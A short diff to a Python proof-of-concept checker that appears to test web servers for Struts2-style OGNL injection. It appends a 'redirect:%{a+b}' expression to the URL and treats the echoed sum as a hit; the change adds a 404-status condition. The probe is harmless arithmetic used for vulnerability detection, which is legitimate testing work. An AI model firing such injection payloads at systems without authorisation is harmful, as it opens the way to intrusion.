@@ -29,8 +29,8 @@ def poc(url):
         c = a + b
         url = url + "?redirect:%25{" + "%s}" % str(a+b)
         response = requests.get(url=url, headers=header, timeout=5)
-        if str(c) in response.text:
-            return True
+        if str(c) in response.text and response.status_code == 404:
+        	return True
         else:
             return False
     except Exception:
